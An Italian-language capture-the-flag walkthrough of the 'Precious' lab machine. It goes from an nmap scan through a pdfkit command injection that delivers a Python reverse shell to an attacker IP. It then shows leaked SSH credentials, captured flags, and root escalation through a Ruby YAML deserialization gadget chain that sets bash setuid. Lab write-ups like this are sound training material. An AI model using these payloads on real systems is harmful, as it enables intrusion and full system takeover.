---------------------------------------------------------------------------------------------------------------
nmap -A -Pn -n -vvv 10.10.11.189

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEAPxqUubE88njHItE+mjeWJXOLu5reIBmQHCYh2ETYO5zatgel+LjcYdgaa4KLFyw8CfDbRL9swlmGTaf4iUbao4jD73HV9/Vrnby7zP04OH3U/wVbAKbPJrjnva/czuuV6uNz4SVA3qk0bp6wOrxQFzCn5OvY3FTcceH1jrjrJmUKpGZJBZZO6cp0HkZWs/eQi8F7anVoMDKiiuP0VX28q/yR1AFB4vR5ej8iV/X73z3GOs3ZckQMhOiBmu1FF77c7VW1zqln480/AbvHJDULtRdZ5xrYH1nFynnPi6+VU/PIfVMpHbYu7t0mEFeI5HxMPNUvtYRRDC14jEtH6RpZxd7PhwYiBctiybZbonM5UP0lP85OuMMPcSMll65+8hzMMY2aejjHTYqgzd7M6HxcEMrJW7n7s5eCJqMoUXkL8RSBEQSmMUV8iWzHW0XkVUfYT5Ko6Xsnb+DiiLvFNUlFwO6hWz2WG8rlZ3voQ/gv8BLVCU1ziaVGerd61PODck=
|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFScv6lLa14Uczimjt1W7qyH6OvXIyJGrznL1JXzgVFdABwi/oWWxUzEvwP5OMki1SW9QKX7kKVznWgFNOp815Y=
|   256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH+JGiTFGOgn/iJUoLhZeybUvKeADIlm0fHnP/oZ66Qb
80/tcp open  http    syn-ack nginx 1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


---------------------------------------------------------------------------------------------------------------
Creiamo il record nel file degli host name 
sudo vi /etc/hosts
[ip]	[host]
sudo echo "10.10.11.189  precious.htb" >> /etc/hosts

---------------------------------------------------------------------------------------------------------------
Effettuiamo una scansione con dirb 
dirb http://10.10.11.189 -w /usr/share/wordlists/dirb/common.txt

Niente di interessante

---------------------------------------------------------------------------------------------------------------
Indaghiamo sul sito web -> precious.htb 
Se carichiamo un link produce un pdf

Controlliamo i metadati del file generato -> exiftool j45dkrpg15btivca061c9c6b7aqsoqvq.pdf

Come unica informazione utile, abbiamo il software che l'ha generato -> Generated by pdfkit v0.8.6

Cerchiamo su internet se troviamo qualcosa.
La versione risulta essere affetta da Command Injection -> https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795

Facciamo un check -> http://10.10.16.47:9000/?name=%20`id` -> Funziona

Proviamo a inserire una backdoor

nc -lvnp 9001

http://10.10.16.47:9000/?name=%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.47",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'` 

CONNESSI
---------------------------------------------------------------------------------------------------------------
Girovaghiamo e troviamo due utenti: ruby ed henry.

In ruby troviamo un file di conf -> henry:Q3c1AqGHtoI0aXAYFH
SONO LE CREDENZIALI SSH

cat user.txt -> 572c0be2d5078c000b8787be407cc02a

---------------------------------------------------------------------------------------------------------------
Verifichiamo che versione di Python è installata nella macchina e passiamo ad una shell con pieni comandi
python3 -c 'import pty; pty.spawn("/bin/bash")'

Cerchiamo se l'utente è tra i sudoers
sudo -l

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
    
cat /opt/update_dependencies.rb -> legge un file yml utilizzando l'istruzione YAML.load, che risulta affetta da bug

cat > dependencies.yml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve

sudo /usr/bin/ruby /opt/update_dependencies.rb

Ci ritorna la risposta al comando id. Riproviamo con il seguente codice

---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: chmod +s /bin/bash
         method_id: :resolve

sudo /usr/bin/ruby /opt/update_dependencies.rb
/bin/bash -p -> cat /root/root.txt -> 944d74ac5887e3e556e8c518cf486b41
